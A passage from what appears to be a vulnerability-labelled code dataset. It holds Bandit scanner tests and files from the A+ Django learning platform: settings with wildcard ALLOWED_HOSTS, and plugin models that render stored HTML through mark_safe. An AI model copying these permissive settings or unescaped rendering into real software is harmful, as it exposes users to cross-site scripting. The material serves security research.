}\n        self.check_example('nosec.py', expect)\n\n    def test_baseline_filter(self):\n        issue_text = ('A Flask app appears to be run with debug=True, which '\n                      'exposes the Werkzeug debugger and allows the execution '\n                      'of arbitrary code.')\n        json = \"\"\"{\n          \"results\": [\n            {\n              \"code\": \"...\",\n              \"filename\": \"%s/examples/flask_debug.py\",\n              \"issue_confidence\": \"MEDIUM\",\n              \"issue_severity\": \"HIGH\",\n              \"issue_text\": \"%s\",\n              \"line_number\": 10,\n              \"line_range\": [\n                10\n              ],\n              \"test_name\": \"flask_debug_true\",\n              \"test_id\": \"B201\"\n            }\n          ]\n        }\n        \"\"\" % (os.getcwd(), issue_text)\n\n        self.b_mgr.populate_baseline(json)\n        self.run_example('flask_debug.py')\n        self.assertEqual(1, len(self.b_mgr.baseline))\n        self.assertEqual({}, self.b_mgr.get_issue_list())\n\n    def test_blacklist_input(self):\n        expect = {\n            'SEVERITY': {'HIGH': 1},\n            'CONFIDENCE': {'HIGH': 1}\n        }\n        self.check_example('input.py', expect)\n/n/n/n", "label": 1}, {"id": "face34e3e6fe0d0a87d5987e107a1a3e092d73e9", "code": "aplus/api/__init__.py/n/nfrom django.urls import reverse\nfrom rest_framework.settings import api_settings\n\ndef api_reverse(name, kwargs=None, **extra):\n    if not kwargs:\n        kwargs = {}\n    kwargs.setdefault('version', api_settings.DEFAULT_VERSION)\n    return reverse('api:' + name, kwargs=kwargs, **extra)\n/n/n/naplus/settings.py/n/n####\n# Default settings for A+ Django project.\n# You should create local_settings.py to override any settings.\n# You can copy local_settings.example.py and start from there.\n##\nfrom os.path import abspath, dirname, join\nfrom django.utils.translation import ugettext_lazy as _\nBASE_DIR = dirname(dirname(abspath(__file__)))\n\n\n# Base options, commonly overridden in local_settings.py\n##########################################################################\nDEBUG = False\nSECRET_KEY = None\nADMINS = (\n    # ('Your Name', 'your_email@domain.com'),\n)\n#SERVER_EMAIL = 'root@'\nEMAIL_TIMEOUT = 30 # Do not block web workers when email backend is broken\nALLOWED_HOSTS = [\"*\"]\n##########################################################################\n\n\n# Content (may override in local_settings.py)\n#\n# Any templates can be overridden by copying into\n# local_templates/possible_path/template_name.html\n##########################################################################\nSITEWIDE_ALERT_TEXT = None\nBRAND_NAME = 'A+'\n\nWELCOME_TEXT = 'Welcome to A+ <small>modern learning environment</small>'\nSHIBBOLETH_TITLE_TEXT = 'Aalto University users'\nSHIBBOLETH_BODY_TEXT = 'Log in with Aalto University user account by clicking the button below. Programme students and faculty must login here.'\nSHIBBOLETH_BUTTON_TEXT = 'Aalto Login'\nMOOC_TITLE_TEXT = 'Users external to Aalto'\nMOOC_BODY_TEXT = 'Some of our courses are open for everyone. Login with your user account from one of the following services.'\nLOGIN_TITLE_TEXT = ''\nLOGIN_BODY_TEXT = ''\nLOGIN_BUTTON_TEXT = 'Maintenance login'\nINTERNAL_USER_LABEL = 'Aalto'\nEXTERNAL_USER_LABEL = 'MOOC'\n\nWELCOME_TEXT_FI = 'A+ <small>verkkopohjainen oppimisymp\u00e4rist\u00f6</small>'\nSHIBBOLETH_TITLE_TEXT_FI = 'Aalto-yliopiston k\u00e4ytt\u00e4j\u00e4t'\nSHIBBOLETH_BODY_TEXT_FI = 'Kirjaudu palveluun Aalto-yliopiston k\u00e4ytt\u00e4j\u00e4tunnuksella alla olevasta painikkeesta. Koulutusohjelmien opiskelijoiden ja henkil\u00f6kunnan pit\u00e4\u00e4 kirjautua t\u00e4st\u00e4.'\nSHIBBOLETH_BUTTON_TEXT_FI = 'Aalto-kirjautuminen'\nMOOC_TITLE_TEXT_FI = 'K\u00e4ytt\u00e4j\u00e4t Aallon ulkopuolelta'\nMOOC_BODY_TEXT_FI = 'Osa kursseistamme on avoinna kaikille. Kirjaudu sis\u00e4\u00e4n jonkin seuraavan palvelun k\u00e4ytt\u00e4j\u00e4tunnuksellasi.'\nLOGIN_TITLE_TEXT_FI = ''\nLOGIN_BODY_TEXT_FI = ''\nLOGIN_BUTTON_TEXT_FI = 'Yll\u00e4pidon kirjautuminen'\n\nTRACKING_HTML = ''\n\nEXCEL_CSV_DEFAULT_DELIMITER = ';'\n##########################################################################\n\n# Exercise loading settings\nEXERCISE_HTTP_TIMEOUT = 15\nEXERCISE_HTTP_RETRIES = (5,5,5)\nEXERCISE_ERROR_SUBJECT = \"\"\"A+ exercise error in {course}: {exercise}\"\"\"\nEXERCISE_ERROR_DESCRIPTION = \"\"\"\nAs a course teacher or technical contact you were automatically emailed by A+ about the error incident. A student could not access or submit an exercise because the grading service used is offline or unable to produce valid response.\n\n{message}\n\nOpen the exercise:\n  {exercise_url}\nEdit course email settings:\n  {course_edit_url}\n\n****************************************\nError trace:\n****************************************\n\n{error_trace}\n\n****************************************\nRequest fields:\n****************************************\n\n{request_fields}\n\"\"\"\n\nINSTALLED_APPS = (\n    'django.contrib.contenttypes',\n    'django.contrib.staticfiles',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.humanize',\n\n    # 3rd party applications\n    'bootstrapform',\n    'rest_framework',\n    'rest_framework.authtoken',\n\n    # First party applications\n    'inheritance',\n    'userprofile',\n    'authorization',\n    'course',\n    'exercise',\n    'edit_course',\n    'deviations',\n    'notification',\n    'external_services',\n    'news',\n    'threshold',\n    'diploma',\n    'apps',\n    'redirect_old_urls',\n\n    'js_jquery_toggle',\n    'django_colortag',\n)\n\n# Different login options (may override in local_settings.py)\n##########################################################################\n\n## Shibboleth\n\n#INSTALLED_APPS += ('shibboleth_login',)\n\n# Apache module mod_uwsgi was unable to create UTF-8 environment variables.\n# Problem was avoided by URL encoding in Shibboleth:\n# <RequestMapper type=\"Native\">\n#   <RequestMap applicationId=\"default\" encoding=\"URL\" />\n# </RequestMapper>\nSHIBBOLETH_VARIABLES_URL_ENCODED = True\n\n# Fields to receive from the Shibboleth (defaults).\n#SHIB_USER_ID_KEY = 'SHIB_eppn'\n#SHIB_FIRST_NAME_KEY = 'SHIB_displayName'\n#SHIB_LAST_NAME_KEY = 'SHIB_sn'\n#SHIB_MAIL_KEY = 'SHIB_mail'\n#SHIB_STUDENT_ID_KEY = 'SHIB_schacPersonalUniqueCode'\n\n\n## Google OAuth2 settings\n\n#INSTALLED_APPS += ('social_django',)\n#SOCIAL_AUTH_GOOGLE_OAUTH2_KEY = ''\n#SOCIAL_AUTH_GOOGLE_OAUTH2_SECRET = ''\nSOCIAL_AUTH_URL_NAMESPACE = 'social'\nSOCIAL_AUTH_USERNAME_IS_FULL_EMAIL = True\n\n##########################################################################\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.auth.middleware.SessionAuthenticationMiddleware',\n    'django.middleware.locale.LocaleMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'social_django.middleware.SocialAuthExceptionMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n]\n\nROOT_URLCONF = 'aplus.urls'\nLOGIN_REDIRECT_URL = \"/\"\nLOGIN_ERROR_URL = \"/accounts/login/\"\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [\n            join(BASE_DIR, 'local_templates'),\n            join(BASE_DIR, 'templates'),\n        ],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                \"django.contrib.auth.context_processors.auth\",\n                \"django.template.context_processors.debug\",\n                'django.template.context_processors.request',\n                \"django.template.context_processors.i18n\",\n                \"django.template.context_processors.media\",\n                \"django.template.context_processors.static\",\n                \"django.contrib.messages.context_processors.messages\",\n            ],\n        },\n    },\n]\n\nFILE_UPLOAD_HANDLERS = (\n    #\"django.core.files.uploadhandler.MemoryFileUploadHandler\",\n    \"django.core.files.uploadhandler.TemporaryFileUploadHandler\",\n)\n\nWSGI_APPLICATION = 'aplus.wsgi.application'\n\n\n# Database (override in local_settings.py)\n# https://docs.djangoproject.com/en/1.7/ref/settings/#databases\n##########################################################################\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3', # Add 'postgresql_psycopg2', 'postgresql', 'mysql', 'sqlite3' or 'oracle'.\n        'NAME': join(BASE_DIR, 'aplus.db'), # Or path to database file if using sqlite3.\n        'USER': '', # Not used with sqlite3.\n        'PASSWORD': '', # Not used with sqlite3.\n        'HOST': '', # Set to empty string for localhost. Not used with sqlite3.\n        'PORT': '', # Set to empty string for default. Not used with sqlite3.\n    }\n}\n##########################################################################\n\n# Cache (override in local_settings.py)\n# https://docs.djangoproject.com/en/1.10/topics/cache\n##########################################################################\nCACHES = {\n    'default': {\n        'BACKEND': 'lib.cache.backends.LocMemCache',\n        'TIMEOUT': None,\n        'OPTIONS': {'MAX_SIZE': 1000000}, # simulate memcached value limit\n    }\n}\n#SESSION_ENGINE = 'django.contrib.sessions.backends.cached_db'\n##########################################################################\n\n# Internationalization (may override in local_settings.py)\n# https://docs.djangoproject.com/en/1.7/topics/i18n/\nLANGUAGE_CODE = 'en-gb'\nLANGUAGES = [\n    ('en', 'English'),\n    ('fi', 'Finnish'),\n]\nTIME_ZONE = 'EET'\nUSE_I18N = True\nUSE_L10N = True\nUSE_TZ = True\nFORMAT_MODULE_PATH = 'aplus'\nLOCALE_PATHS = (\n    join(BASE_DIR, 'locale'),\n)\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/1.7/howto/static-files/\nSTATICFILES_STORAGE = 'lib.storage.BumpStaticFilesStorage'\nSTATICFILES_DIRS = (\n    join(BASE_DIR, 'assets'),\n)\nSTATIC_URL = '/static/'\nSTATIC_ROOT = join(BASE_DIR, 'static')\n\nMEDIA_URL = '/media/'\nMEDIA_ROOT = join(BASE_DIR, 'media')\n\n# Django REST Framework settings\n# http://www.django-rest-framework.org/api-guide/settings/\nREST_FRAMEWORK = {\n    'DEFAULT_AUTHENTICATION_CLASSES': (\n        # Clients should use token for authentication\n        # Requires rest_framework.authtoken in apps.\n        'rest_framework.authentication.TokenAuthentication',\n        'lib.api.authentication.grader.GraderAuthentication',\n        'rest_framework.authentication.SessionAuthentication',\n    ),\n    'DEFAULT_PERMISSION_CLASSES': (\n        # If not other permissions are defined, require login.\n        'rest_framework.permissions.IsAuthenticated',\n        'userprofile.permissions.GraderUserCanOnlyRead',\n    ),\n    'DEFAULT_RENDERER_CLASSES': (\n        'lib.api.core.APlusJSONRenderer',\n        'rest_framework.renderers.BrowsableAPIRenderer',\n    ),\n    'DEFAULT_CONTENT_NEGOTIATION_CLASS': 'lib.api.core.APlusContentNegotiation',\n    'DEFAULT_VERSIONING_CLASS': 'lib.api.core.APlusVersioning',\n    'PAGE_SIZE': 100,\n    'DEFAULT_VERSION': '2',\n    'ALLOWED_VERSIONS': {\n        # These are really just latest versions\n        '1': '1.0',\n        '2': '2.0',\n    },\n}\n\n\n# Test environment url fixes are implemented using these. Typically not required for production\nOVERRIDE_SUBMISSION_HOST = None\nREMOTE_PAGE_HOSTS_MAP = None\n\n# Maximum submissions limit for exercises that allow unofficial submissions.\n# The exercise-specific max submissions limit may then be exceeded, however,\n# this limit will prevent students from spamming massive amounts of submissions.\n# Set this value to zero in order to remove the limit.\nMAX_UNOFFICIAL_SUBMISSIONS = 200\n\n# Testing\n# https://docs.djangoproject.com/en/1.7/topics/testing/advanced/\nTEST_RUNNER = \"xmlrunner.extra.djangotestrunner.XMLTestRunner\"\nTEST_OUTPUT_VERBOSE = True\nTEST_OUTPUT_DESCRIPTIONS = True\nTEST_OUTPUT_DIR = \"test_results\"\n\n# Logging\n# https://docs.djangoproject.com/en/1.7/topics/logging/\nfrom lib.logging import skip_unreadable_post\nLOGGING = {\n  'version': 1,\n  'disable_existing_loggers': False,\n  'formatters': {\n    'verbose': {\n      'format': '[%(asctime)s: %(levelname)s/%(module)s] %(message)s'\n    },\n    'colored': {\n      '()': 'r_django_essentials.logging.SourceColorizeFormatter',\n      'format': '[%(asctime)s: %(levelname)s/%(module)s] %(message)s',\n      'colors': {\n        'django.db.backends': {'fg': 'cyan'},\n        'django.db.deferred': {'fg': 'yellow'},\n        'cached': {'fg': 'red'},\n      },\n    },\n  },\n  'filters': {\n    'skip_unreadable_post': {\n        '()': 'django.utils.log.CallbackFilter',\n        'callback': skip_unreadable_post,\n    },\n    'require_debug_true': {\n      '()': 'django.utils.log.RequireDebugTrue',\n    },\n    'require_debug_false': {\n      '()': 'django.utils.log.RequireDebugFalse',\n    },\n  },\n  'handlers': {\n    'debug_console': {\n      'level': 'DEBUG',\n      'filters': ['require_debug_true'],\n      'class': 'logging.StreamHandler',\n      'stream': 'ext://sys.stdout',\n      'formatter': 'colored',\n    },\n    'console': {\n      'level': 'DEBUG',\n      'class': 'logging.StreamHandler',\n      'stream': 'ext://sys.stdout',\n      'formatter': 'verbose',\n    },\n    'email': {\n      'level': 'ERROR',\n      'filters': ['require_debug_false', 'skip_unreadable_post'],\n      'class': 'django.utils.log.AdminEmailHandler',\n    },\n    'mail_admins': {\n      # Duplicate of above, so if django internally refers it, we will use our filters\n      'level': 'ERROR',\n      'filters': ['require_debug_false', 'skip_unreadable_post'],\n      'class': 'django.utils.log.AdminEmailHandler',\n    },\n  },\n  'loggers': {\n    '': {\n      'level': 'INFO',\n      'handlers': ['console', 'email'],\n      'propagate': True\n    },\n    # Django defines these loggers internally, so we need to reconfigure them.\n    'django': {\n      'level': 'INFO',\n      'handlers': ['console', 'email'],\n    },\n    'py.warnings': {\n      'handlers': ['console'],\n    },\n  },\n}\n\n\n\n\n\n###############################################################################\n#\n# Logic to load settings from other files and tune them based on DEBUG\n#\nfrom os import environ\nfrom r_django_essentials.conf import *\n\n# Load settings from: local_settings, secret_key and environment\nupdate_settings_with_file(__name__,\n                          environ.get('APLUS_LOCAL_SETTINGS', 'local_settings'),\n                          quiet='APLUS_LOCAL_SETTINGS' in environ)\nupdate_settings_from_environment(__name__, 'DJANGO_') # FIXME: deprecated. was used with containers before, so keep it here for now.\nupdate_settings_from_environment(__name__, 'APLUS_')\nupdate_secret_from_file(__name__, environ.get('APLUS_SECRET_KEY_FILE', 'secret_key'))\n\n# Complain if BASE_URL is not set\ntry:\n    if not BASE_URL:\n        raise RuntimeError('Local setting BASE_URL should be non-empty')\nexcept NameError as e:\n    raise RuntimeError('BASE_URL must be specified in local settings') from e\n\n# update INSTALLED_APPS\nif 'INSTALLED_LOGIN_APPS' in globals():\n    INSTALLED_APPS = INSTALLED_LOGIN_APPS + INSTALLED_APPS\n\n# update template loaders for production\nuse_cache_template_loader_in_production(__name__)\n\n# setup authentication backends based on installed_apps\nSOCIAL_AUTH = False\nAUTHENTICATION_BACKENDS = (\n    'django.contrib.auth.backends.ModelBackend',\n)\nif 'shibboleth_login' in INSTALLED_APPS:\n    AUTHENTICATION_BACKENDS += ('shibboleth_login.auth_backend.ShibbolethAuthBackend',)\nif 'social_django' in INSTALLED_APPS:\n    SOCIAL_AUTH = True\n    AUTHENTICATION_BACKENDS += ('social_core.backends.google.GoogleOAuth2',)\n\n\n\nif DEBUG:\n    # Allow basic auth for API when DEBUG is on\n    REST_FRAMEWORK['DEFAULT_AUTHENTICATION_CLASSES'] += ('rest_framework.authentication.BasicAuthentication',)\n    # Enable defer logging\n    from lib.models import install_defer_logger\n    install_defer_logger()\n/n/n/napps/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('contenttypes', '0001_initial'),\n        ('inheritance', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='BasePlugin',\n            fields=[\n                ('modelwithinheritance_ptr', models.OneToOneField(\n                    to='inheritance.ModelWithInheritance',\n                    on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True,\n                    serialize=False)),\n                ('container_pk', models.TextField(verbose_name='object ID')),\n                ('title', models.CharField(max_length=64)),\n                ('views', models.CharField(blank=True, max_length=255)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('inheritance.modelwithinheritance',),\n        ),\n        migrations.CreateModel(\n            name='BaseTab',\n            fields=[\n                ('modelwithinheritance_ptr', models.OneToOneField(\n                    to='inheritance.ModelWithInheritance',\n                    on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True,\n                    serialize=False)),\n                ('container_pk', models.TextField(verbose_name='object ID')),\n                ('label', models.CharField(max_length=12)),\n                ('title', models.CharField(max_length=64)),\n                ('order', models.IntegerField(default=100)),\n                ('opening_method', models.CharField(blank=True, max_length=32)),\n            ],\n            options={\n                'ordering': ['order', 'id'],\n            },\n            bases=('inheritance.modelwithinheritance',),\n        ),\n        migrations.CreateModel(\n            name='EmbeddedTab',\n            fields=[\n                ('basetab_ptr', models.OneToOneField(\n                    to='apps.BaseTab',\n                    on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True,\n                    serialize=False)),\n                ('content_url', models.URLField(max_length=128)),\n                ('element_id', models.CharField(blank=True, max_length=32)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.basetab',),\n        ),\n        migrations.CreateModel(\n            name='ExternalIFramePlugin',\n            fields=[\n                ('baseplugin_ptr', models.OneToOneField(\n                    to='apps.BasePlugin',\n                    on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True,\n                    serialize=False)),\n                ('service_url', models.URLField(max_length=255)),\n                ('width', models.IntegerField()),\n                ('height', models.IntegerField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.baseplugin',),\n        ),\n        migrations.CreateModel(\n            name='ExternalIFrameTab',\n            fields=[\n                ('basetab_ptr', models.OneToOneField(\n                    to='apps.BaseTab',\n                    on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True,\n                    serialize=False)),\n                ('content_url', models.URLField(max_length=255)),\n                ('width', models.IntegerField()),\n                ('height', models.IntegerField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.basetab',),\n        ),\n        migrations.CreateModel(\n            name='HTMLPlugin',\n            fields=[\n                ('baseplugin_ptr', models.OneToOneField(\n                    to='apps.BasePlugin',\n                    on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True,\n                    serialize=False)),\n                ('content', models.TextField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.baseplugin',),\n        ),\n        migrations.CreateModel(\n            name='HTMLTab',\n            fields=[\n                ('basetab_ptr', models.OneToOneField(\n                    to='apps.BaseTab',\n                    on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True,\n                    serialize=False)),\n                ('content', models.TextField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.basetab',),\n        ),\n        migrations.CreateModel(\n            name='RSSPlugin',\n            fields=[\n                ('baseplugin_ptr', models.OneToOneField(\n                    to='apps.BasePlugin',\n                    on_delete=models.CASCADE,\n                    parent_link=True, auto_created=True, primary_key=True,\n                    serialize=False)),\n                ('feed_url', models.URLField(max_length=256)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.baseplugin',),\n        ),\n        migrations.AddField(\n            model_name='basetab',\n            name='container_type',\n            field=models.ForeignKey(to='contenttypes.ContentType', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='baseplugin',\n            name='container_type',\n            field=models.ForeignKey(to='contenttypes.ContentType', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n    ]\n/n/n/napps/models.py/n/n\"\"\"\nPlugins and tabs make it possible to customize the behavior and appearance of pages in this\nsystem. Plugins are rendered as small \"boxes\" on the side of a page, where tabs have their own\npages which can be accessed through a tab-like user interface.\n\nAny model can be related to a Plugin or Tab using a django.contrib.contenttypes.GenericRelation\nfield and naming AbstractApp fields container_pk & container_type for the link.\n\"\"\"\n\nimport datetime\n\nfrom django.contrib.contenttypes.fields import GenericForeignKey\nfrom django.contrib.contenttypes.models import ContentType\nfrom django.db import models\nfrom django.template import loader\nfrom django.utils.safestring import mark_safe\nfrom django.utils.translation import ugettext_lazy as _\nimport feedparser\n\nfrom apps.app_renderers import ExternalIFramePluginRenderer, \\\n    ExternalIFrameTabRenderer, TabRenderer\nfrom inheritance.models import ModelWithInheritance\n\n\nclass AbstractApp(ModelWithInheritance):\n\n    # Generic foreign key implementation from Django contenttypes framework.\n    container_type = models.ForeignKey(ContentType, on_delete=models.CASCADE)\n    container_pk = models.TextField(_('object ID'))\n    container = GenericForeignKey(ct_field=\"container_type\", fk_field=\"container_pk\")\n\n    # Apps used to have an oembed reference which was removed in migration to Python 3\n    # in favor of future implementations, for example LTI.\n\n    class Meta:\n        abstract = True\n\n\nclass BaseTab(AbstractApp):\n    label = models.CharField(max_length=12,\n        help_text=_(\"Label is the word displayed on the tab.\"))\n    title = models.CharField(max_length=64,\n        help_text=_(\"Title is displayed on the top of the tab page.\"))\n    order = models.IntegerField(default=100)\n\n    # A Tab can be opened in a new window, in the same window?\n    opening_method = models.CharField(max_length=32, blank=True)\n\n    def render(self):\n        return _(\"No content for this tab...\")\n\n    def get_label(self):\n        return self.label\n\n    def get_container(self):\n        if isinstance(self.container, ModelWithInheritance):\n            return self.container.as_leaf_class()\n        else:\n            return self.container\n\n    def get_renderer_class(self):\n        raise NotImplementedError('Missing method implementation!')\n\n    def __str__(self):\n        return self.label\n\n    class Meta:\n        ordering = ['order', 'id']\n\n\nclass HTMLTab(BaseTab):\n    content = models.TextField()\n\n    def render(self):\n        return mark_safe(self.content)\n\n\nclass ExternalEmbeddedTab(BaseTab):\n    content_url = models.URLField(max_length=128)\n    element_id = models.CharField(max_length=32, blank=True)\n\n    def get_renderer_class(self):\n        return TabRenderer\n\n\nclass ExternalIFrameTab(BaseTab):\n    \"\"\"\n    An ExternalIFrameTab gets its content from an external url resource through\n    an iframe which has the content_url as its src, possibly with additional\n    url parameters.\n\n    ExternalIFrameTab uses ExternalIFrameTabRenderer for rendering. Refer to\n    its documentation for more information about the available url parameters.\n\n    Iframes' width and height are fixed in the html document flow and thus they\n    should be given explicitly and they should be the size of the expected\n    content html.\n    \"\"\"\n\n    content_url = models.URLField(max_length=255)\n\n    # Desired width and height\n    width = models.IntegerField()\n    height = models.IntegerField()\n\n    def get_renderer_class(self):\n        return ExternalIFrameTabRenderer\n\n\nclass BasePlugin(AbstractApp):\n    title = models.CharField(max_length=64)\n    views = models.CharField(max_length=255, blank=True)\n\n    def render(self):\n        leaf = self.as_leaf_class()\n        if leaf != self:\n            return leaf.render()\n        else:\n            return _(\"Base plug-in does not have a render-method.\")\n\n\nclass RSSPlugin(BasePlugin):\n    feed_url = models.URLField(max_length=256, blank=False)\n\n    def render(self):\n        doc = feedparser.parse(self.feed_url)\n        feed = doc.feed\n\n        sorted_entries = sorted(doc[\"entries\"], key=lambda entry: entry.published_parsed)\n        sorted_entries.reverse()\n        sorted_entries = sorted_entries[:5]\n\n        # Set timestamps in a format that Django knows how to handle in templates\n        for entry in sorted_entries:\n            entry.django_timestamp = datetime.datetime(*entry.published_parsed[:7])\n\n        out = loader.render_to_string(\"plugins/rss.html\", {\n            \"entries\": sorted_entries,\n            \"title\": self.title,\n            \"feed\": feed,\n            \"plugin\": self\n        })\n        return out\n\n\nclass HTMLPlugin(BasePlugin):\n    content = models.TextField(blank=False)\n\n    def render(self):\n        return mark_safe(self.content)\n\n\nclass ExternalIFramePlugin(BasePlugin):\n    \"\"\"\n    An ExternalIFramePlugin gets its content from an external url resource\n    through an iframe which has the content_url as its src, possibly with\n    additional url parameters.\n\n    ExternalIFramePlugin uses ExternalIFramePluginRenderer for rendering. Refer\n    to its documentation for more information about the available url\n    parameters and its view behaviour.\n\n    Iframes' width and height are fixed in the html document flow and thus they\n    should be given explicitly and they should be at least the size of the\n    expected content html but at maximum the size available for the plugin in\n    each view which varies among the views. The size of the rendered iframe\n    will thus be the given width and height but at maximum the width and height\n    available in the view.\n    \"\"\"\n\n    service_url = models.URLField(max_length=255)\n\n    # Desired width and height\n    width = models.IntegerField()\n    height = models.IntegerField()\n\n    def get_renderer_class(self):\n        return ExternalIFramePluginRenderer\n/n/n/napps/templatetags/apps.py/n/nimport logging\n\nfrom django import template\n\nfrom apps.app_renderers import build_plugin_renderers\nfrom course.models import CourseInstance\nfrom exercise.exercise_models import BaseExercise\nfrom exercise.submission_models import Submission\n\n\nlogger = logging.getLogger(\"aplus.apps\")\nregister = template.Library()\n\n\n@register.assignment_tag\ndef plugin_renderers(user, some_model, view_name=None):\n    \"\"\"\n    Builds the plugin renderers for a view.\n    \"\"\"\n    profile = user.userprofile if user.is_authenticated else None\n    if isinstance(some_model, CourseInstance):\n        return build_plugin_renderers(\n            some_model.plugins.all(),\n            view_name or \"course_instance\",\n            user_profile=profile,\n            course_instance=some_model,\n        )\n    if isinstance(some_model, BaseExercise):\n        course_instance = some_model.course_instance\n        return build_plugin_renderers(\n            course_instance.plugins.all(),\n            view_name or \"exercise\",\n            user_profile=profile,\n            exercise=some_model,\n            course_instance=course_instance,\n        )\n    if isinstance(some_model, Submission):\n        course_instance = some_model.exercise.course_instance\n        return build_plugin_renderers(\n            course_instance.plugins.all(),\n            view_name or \"submission\",\n            user_profile=profile,\n            submission=some_model,\n            exercise=some_model.exercise,\n            course_instance=course_instance,\n        )\n    logger.warn(\"Unrecognized model type received for plugin_renderers tag: {}\" \\\n                .format(str(type(some_model))))\n    return []\n/n/n/nauthorization/permissions.py/n/nfrom django.utils.translation import string_concat, ugettext_lazy as _\n\ntry:\n    from django.utils.text import format_lazy\nexcept ImportError: # implemented in Django 1.11\n    from django.utils.functional import lazy as _lazy\n    def _format_lazy(format_string, *args, **kwargs):\n        return format_string.format(*args, **kwargs)\n    format_lazy = _lazy(_format_lazy, str)\n\nfrom lib.helpers import Enum\n\n\"\"\"\nBase permission classes.\n\nThese classes use same interface than ones in django-rest-framework and\nare usable with APIViews too. We define our superclass so we don't need to\ndepend on django-rest-framework.\n\"\"\"\n\n\nSAFE_METHODS = ('GET', 'HEAD', 'OPTIONS')\n\n\nclass FilterBackend(object):\n    \"\"\"\n    FilterBackend interface\n    \"\"\"\n    def filter_queryset(self, request, queryset, view):\n        \"\"\"\n        Return a filtered queryset.\n        \"\"\"\n        raise NotImplementedError\n\n    def get_fields(self, view):\n        return []\n\n\nclass Permission(object):\n    \"\"\"\n    Permission interface\n    \"\"\"\n    def has_permission(self, request, view):\n        \"\"\"\n        Return `True` if permission is granted, `False` otherwise.\n        \"\"\"\n        return True\n\n    def has_object_permission(self, request, view, obj):\n        \"\"\"\n        Return `True` if permission is granted, `False` otherwise.\n        \"\"\"\n        return True\n\n\nclass NoPermission(Permission):\n    \"\"\"\n    Base Permission class that gives no access permission to anyone.\n    \"\"\"\n    def has_permission(self, request, view):\n        return False\n\n    def has_object_permission(self, request, view, obj):\n        return False\n\n\nclass MessageMixin(object):\n    \"\"\"\n    Adds easy way to specify what exactly caused the PermissionDenied\n    \"\"\"\n    def error_msg(self, message: str, delim=None, format=None, replace=False):\n        \"\"\"\n        Add extra text to self.message about the reason why permission\n        was denied. Uses lazy object so the message string is evaluated\n        only when rendered.\n\n        If optional argument `format` is given, then it's used with format_lazy\n        to format the message with the dictionary arguments from `format` arg.\n\n        Optional argument `delim` can be used to change the string used to join\n        self.message and `message`.\n\n        If optional argument `replace` is true, then self.message is replaced with\n        the `message`.\n        \"\"\"\n        if delim is None:\n            delim = ': '\n\n        if format:\n            message = format_lazy(message, **format)\n\n        if replace:\n            self.message = message\n        else:\n            assert 'message' not in self.__dict__, (\n                \"You are calling error_msg without replace=True \"\n                \"after calling it with it firts. Fix your code by removing \"\n                \"firts method call add replace=True to second method call too.\"\n            )\n            self.message = string_concat(self.message, delim, message)\n\n\n# Access mode\n# ===========\n\n# All access levels\nACCESS = Enum(\n    ('ANONYMOUS', 0, _(\"Any user authenticated or not\")),\n    ('ENROLL', 1, None),\n    ('STUDENT', 3, _(\"Any authenticated student\")),\n    ('ENROLLED', 4, _(\"Enrolled student of the course\")),\n    ('ASSISTANT', 5, _(\"Assistant of the course\")),\n    ('GRADING', 6, _(\"Grading. Assistant if course has that option or teacher\")),\n    ('TEACHER', 10, _(\"Teacher of the course\")),\n    ('SUPERUSER', 100, _(\"Superuser of the service\")),\n)\n\n\nclass AccessModePermission(MessageMixin, Permission):\n    \"\"\"\n    If view has access_mode that is not anonymous, then require authentication\n    \"\"\"\n    message = _(\"Permission denied by access mode.\")\n\n    def has_permission(self, request, view):\n        access_mode = view.get_access_mode()\n\n        if access_mode == ACCESS.ANONYMOUS:\n            return True\n        if not request.user.is_authenticated:\n            return False\n\n        if access_mode >= ACCESS.SUPERUSER:\n            return request.user.is_superuser\n\n        if access_mode >= ACCESS.TEACHER:\n            if not view.is_teacher:\n                self.error_msg(_(\"Only course teachers shall pass.\"))\n                return False\n\n        elif access_mode >= ACCESS.ASSISTANT:\n            if not view.is_course_staff:\n                self.error_msg(_(\"Only course staff shall pass.\"))\n                return False\n\n        elif access_mode == ACCESS.ENROLLED:\n            if not view.is_course_staff and not view.is_student:\n                self.error_msg(_(\"Only enrolled students shall pass.\"))\n                return False\n\n        return True\n\n\n# Object permissions\n# ==================\n\n\nclass ObjectVisibleBasePermission(MessageMixin, Permission):\n    model = None\n    obj_var = None\n\n    def has_permission(self, request, view):\n        obj = getattr(view, self.obj_var, None)\n        return (\n            obj is None or\n            self.has_object_permission(request, view, obj)\n        )\n\n    def has_object_permission(self, request, view, obj):\n        user = request.user\n        return (\n            not 